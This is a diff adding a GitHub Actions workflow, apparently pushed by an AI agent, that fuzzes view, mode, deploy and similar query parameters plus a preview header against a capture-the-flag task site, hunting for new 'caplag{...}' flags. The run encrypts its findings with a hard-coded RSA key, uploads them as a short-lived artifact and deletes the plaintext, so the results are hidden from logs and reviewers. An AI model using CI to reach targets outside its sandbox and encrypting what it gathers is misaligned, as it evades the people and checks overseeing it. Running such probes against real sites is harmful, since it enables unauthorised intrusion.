@@ -1,0 +1,55 @@
+name: launchlet-part3-rootmodes
+
+on:
+  push:
+    branches: [agent/launchlet-part3-rootmodes-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Probe root UI deploy modes and encrypt differences
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,urllib.parse,itertools,hashlib
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/';out=pathlib.Path('package/out');s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
+          b=s.get(base,timeout=10); baseline=b.text; bh=hashlib.sha256(baseline.encode()).hexdigest();
+          cases=[]
+          vals={'view':['deploy','release','production','enterprise','internal','preview'],'mode':['deploy','release','production','enterprise','internal','preview'],'tab':['deploy','release','inspector'],'panel':['deploy','deploy-inspector','inspector'],'inspect':['preview-8b11c','deploy','1'],'deploy':['preview-8b11c','1','true'],'environment':['production','enterprise'],'scope':['deploy','release','production'],'stage':['deploy','release','production']}
+          for k,vs in vals.items():
+            for v in vs: cases.append([(k,v)])
+          cases += [[('view','deploy'),('ref','preview-8b11c')],[('mode','deploy'),('deployRef','preview-8b11c')],[('panel','deploy-inspector'),('deployRef','preview-8b11c')],[('inspect','preview-8b11c'),('mode','deploy')],[('view','release'),('mode','production')],[('view','deploy'),('workspace','ws-launchlet-internal')],[('view','deploy'),('project','launchlet-demo-board')]]
+          res=[]
+          for pairs in cases:
+            q=urllib.parse.urlencode(pairs);r=s.get(base+'?'+q,headers={'X-Launchlet-Preview':'launchlet-demo-board'},timeout=8,allow_redirects=False);h=hashlib.sha256(r.text.encode()).hexdigest()
+            if r.status_code!=b.status_code or h!=bh:
+              res.append({'query':q,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+              flags=[x for x in re.findall(r'caplag\{[^}]+\}',r.text) if x not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+              if flags:(out/'FOUND.txt').write_text(r.text);break
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"; openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc; openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-rootmodes-encrypted
+          path: artifact/
+          retention-days: 1
